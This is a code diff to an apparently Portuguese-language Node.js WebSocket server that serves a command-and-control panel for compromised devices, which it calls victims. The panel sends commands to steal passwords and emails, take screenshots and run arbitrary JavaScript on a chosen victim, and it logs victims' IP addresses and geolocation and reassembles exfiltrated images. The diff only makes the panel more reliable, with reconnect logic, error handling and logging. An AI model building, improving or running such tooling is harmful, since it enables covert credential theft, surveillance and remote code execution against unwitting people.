@@ -8,7 +8,7 @@ const wss = new WebSocket.Server({ server });
 const sessions = {};
 const victimConnections = {};
 const adminClients = new Set();
-const imageChunks = {}; // sess -> { cmd: { total, chunks, title, url } }
+const imageChunks = {};
 
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
@@ -107,27 +107,46 @@ body { background:#0b0d1a; color:#e0e5ff; font-family:'Segoe UI', system-ui, san
 <script>
 const WS_URL = \`wss://\${window.location.host}\`;
 let ws, allData = {}, selectedId = null, currentFilter = 'all';
+let reconnectTimer = null;
+
 function connect() {
+  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
   ws = new WebSocket(WS_URL);
-  ws.onopen = () => { ws.send(JSON.stringify({type:'admin'})); console.log('[+] Conectado'); };
-  ws.onmessage = (e) => {
-    const msg = JSON.parse(e.data);
-    if (msg.type === 'update') {
-      if (!allData[msg.sess]) allData[msg.sess] = [];
-      allData[msg.sess].push(msg);
-      renderSidebar();
-      if (selectedId === msg.sess) renderLogs(selectedId);
-    } else if (msg.type === 'init') {
-      allData = msg.data || {};
-      renderSidebar();
-      const keys = Object.keys(allData);
-      if (keys.length) selectVictim(keys[0]);
-    }
+  ws.onopen = () => {
+    console.log('[+] Conectado ao servidor');
+    ws.send(JSON.stringify({type:'admin'}));
   };
-  ws.onclose = () => setTimeout(connect, 2000);
+  ws.onmessage = (e) => {
+    try {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'update') {
+        if (!allData[msg.sess]) allData[msg.sess] = [];
+        allData[msg.sess].push(msg);
+        renderSidebar();
+        if (selectedId === msg.sess) renderLogs(selectedId);
+      } else if (msg.type === 'init') {
+        allData = msg.data || {};
+        renderSidebar();
+        const keys = Object.keys(allData);
+        if (keys.length) selectVictim(keys[0]);
+      }
+    } catch(err) { console.error('Erro ao processar mensagem:', err); }
+  };
+  ws.onclose = () => {
+    console.log('[-] Desconectado, reconectando em 3s...');
+    if (reconnectTimer) clearTimeout(reconnectTimer);
+    reconnectTimer = setTimeout(connect, 3000);
+  };
+  ws.onerror = (err) => console.error('Erro WebSocket:', err);
 }
+
 function sendCommand(cmd, extra) {
   if (!selectedId) { alert('Selecione uma vítima primeiro!'); return; }
+  if (!ws || ws.readyState !== WebSocket.OPEN) {
+    alert('WebSocket desconectado. Reconectando...');
+    connect();
+    return;
+  }
   const payload = { type: 'command', cmd, target: selectedId };
   if (extra) Object.assign(payload, extra);
   ws.send(JSON.stringify(payload));
@@ -135,6 +154,7 @@ function sendCommand(cmd, extra) {
   allData[selectedId].push({ type: 'cmd_sent', cmd, _t: Date.now() });
   renderLogs(selectedId);
 }
+
 document.getElementById('cmd-screenshot').addEventListener('click', () => sendCommand('screenshot'));
 document.getElementById('cmd-passwords').addEventListener('click', () => sendCommand('get_passwords'));
 document.getElementById('cmd-emails').addEventListener('click', () => sendCommand('get_emails'));
@@ -148,6 +168,7 @@ document.getElementById('cmd-execute').addEventListener('click', () => {
 document.getElementById('cmd-js-input').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') document.getElementById('cmd-execute').click();
 });
+
 function renderSidebar() {
   const ids = Object.keys(allData);
   document.getElementById('total-count').textContent = ids.length;
@@ -161,6 +182,7 @@ function renderSidebar() {
     list.appendChild(li);
   });
 }
+
 function selectVictim(id) {
   selectedId = id;
   document.getElementById('selected-id').textContent = id;
@@ -168,6 +190,7 @@ function selectVictim(id) {
   renderDeviceInfo(id);
   renderLogs(id);
 }
+
 function renderDeviceInfo(id) {
   const logs = allData[id] || [];
   const h = logs.find(l => l.type === 'handshake');
@@ -190,6 +213,7 @@ function renderDeviceInfo(id) {
     \`;
   } else { div.style.display = 'none'; }
 }
+
 function renderLogs(id) {
   const container = document.getElementById('log-container');
   let logs = allData[id] || [];
@@ -260,6 +284,7 @@ function renderLogs(id) {
   container.innerHTML = html;
   container.scrollTop = container.scrollHeight;
 }
+
 document.querySelectorAll('.tabs button').forEach(btn => {
   btn.addEventListener('click', function() {
     document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
@@ -268,6 +293,7 @@ document.querySelectorAll('.tabs button').forEach(btn => {
     if (selectedId) renderLogs(selectedId);
   });
 });
+
 document.getElementById('clear-logs').addEventListener('click', function() {
   if (!selectedId || !confirm('Limpar logs de ' + selectedId + '?')) return;
   allData[selectedId] = [];
@@ -275,6 +301,7 @@ document.getElementById('clear-logs').addEventListener('click', function() {
   renderLogs(selectedId);
   ws.send(JSON.stringify({ type: 'clear', sess: selectedId }));
 });
+
 connect();
 </script></body></html>`);
 });
@@ -293,6 +320,7 @@ wss.on('connection', async (ws) => {
   ws.on('message', (msg) => {
     try {
       const data = JSON.parse(msg);
+      console.log(`[Servidor] Recebido:`, data.type, data.cmd || '');
       if (data.type === 'admin') {
         ws.isAdmin = true;
         adminClients.add(ws);
@@ -314,12 +342,14 @@ wss.on('connection', async (ws) => {
           const cmdPayload = { type: 'command', cmd: data.cmd };
           if (data.code) cmdPayload.code = data.code;
           targetWs.send(JSON.stringify(cmdPayload));
+          console.log(`[Servidor] Comando "${data.cmd}" enviado para ${data.target}`);
           adminClients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
               client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_sent', cmd: data.cmd, _t: Date.now() }));
             }
           });
         } else {
+          console.log(`[Servidor] Vítima ${data.target} offline`);
           adminClients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
               client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_error', error: 'Vítima offline', _t: Date.now() }));
@@ -336,7 +366,6 @@ wss.on('connection', async (ws) => {
           imageChunks[data.sess][key] = { total: data.total, chunks: [], title: data.title, url: data.url };
         }
         imageChunks[data.sess][key].chunks[data.index] = data.data;
-        // Verifica se todos os chunks chegaram
         const chunkData = imageChunks[data.sess][key];
         if (chunkData.chunks.filter(c => c !== undefined).length === data.total) {
           const fullBase64 = chunkData.chunks.join('');
@@ -350,16 +379,14 @@ wss.on('connection', async (ws) => {
             sess: data.sess,
             _t: Date.now()
           };
-          // Envia para todos os admins
+          console.log(`[Servidor] Imagem "${data.cmd}" remontada para ${data.sess}`);
           adminClients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
               client.send(JSON.stringify({ type: 'update', ...result }));
             }
           });
-          // Salva nos logs da sessão
           if (!sessions[data.sess]) sessions[data.sess] = [];
           sessions[data.sess].push(result);
-          // Limpa chunks
           delete imageChunks[data.sess][key];
         }
         return;
@@ -374,7 +401,6 @@ wss.on('connection', async (ws) => {
         }
         if (!sessions[data.sess]) sessions[data.sess] = [];
         if (data.type === 'handshake') { data.ip = ip; data.geo = geo; }
-        console.log(`[${data.sess}] Tipo: ${data.type}, Cmd: ${data.cmd || 'N/A'}`);
         sessions[data.sess].push(data);
         adminClients.forEach(client => {
           if (client.readyState === WebSocket.OPEN) {
@@ -382,7 +408,7 @@ wss.on('connection', async (ws) => {
           }
         });
       }
-    } catch(e) { /* erro de parsing */ }
+    } catch(e) { console.error('[Servidor] Erro ao processar mensagem:', e); }
   });
 
   ws.on('close', () => {
